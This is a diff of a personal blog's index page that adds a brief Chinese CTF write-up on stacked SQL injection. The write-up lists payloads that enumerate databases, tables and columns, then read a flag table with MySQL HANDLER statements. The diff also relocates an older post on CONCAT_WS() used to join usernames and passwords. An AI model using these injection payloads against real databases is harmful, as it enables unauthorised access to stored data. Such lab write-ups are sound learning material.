@@ -116,7 +116,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">29</span>
+          <span class="site-state-item-count">30</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -146,6 +146,71 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://cxdshibaba.github.io/2022/04/12/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cxd的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/12/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">堆叠注入</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2022-04-12 19:14:35 / Modified: 19:35:14" itemprop="dateCreated datePublished" datetime="2022-04-12T19:14:35+08:00">2022-04-12</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>首先发现题目过滤了以下关键字<br><img src="https://i.bmp.ovh/imgs/2022/04/12/f29ffb1c7f8e97de.png"><br>接下来尝试堆叠注入<br>查库：1’;show databases;–+<br><img src="https://i.bmp.ovh/imgs/2022/04/12/1d9547a6d4887d65.png"><br>查表：1’;show tables;–+<br><img src="https://s3.bmp.ovh/imgs/2022/04/12/a9578ab6c1a29a49.png"><br>分别查两个字段<br>1’; show columns from <code>1919810931114514</code> ;–+<br>1’; show columns from words ;–+<br>在1919810931114514中发现flag<br><img src="https://s3.bmp.ovh/imgs/2022/04/12/d94cb4e686054ad0.png"><br>接着可采取handler语句取flag<br>1’;handler <code>1919810931114514</code> open;handler <code>1919810931114514</code> read first;–+<br><img src="https://s3.bmp.ovh/imgs/2022/04/12/7ca5ac3abc251cf2.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -714,71 +779,6 @@
     
     <div class="post-body" itemprop="articleBody">
           <p><img src="https://i.bmp.ovh/imgs/2021/11/3ac693d22e56ecfa.png"><br>好难理解。。。。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://cxdshibaba.github.io/2021/10/31/MYSQL%E4%B8%ADconcat-ws-%E5%87%BD%E6%95%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Cxd的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/10/31/MYSQL%E4%B8%ADconcat-ws-%E5%87%BD%E6%95%B0/" class="post-title-link" itemprop="url">MYSQL中concat_ws()函数</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2021-10-31 23:31:19 / Modified: 23:36:56" itemprop="dateCreated datePublished" datetime="2021-10-31T23:31:19+08:00">2021-10-31</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>指定分隔符<br>使用函数CONCAT_WS()。语法为：CONCAT_WS(separator,str1,str2,…)<br>CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符放在要连接的两个字符串之间。分<br>隔符可以是一个字符串，也可以是其它参数。<br>例：concat_ws(0x7e,username,password)<br>意思为将usernme和password以波浪号的形式进行隔开（0x7e为波浪号）</p>
 
       
     </div>
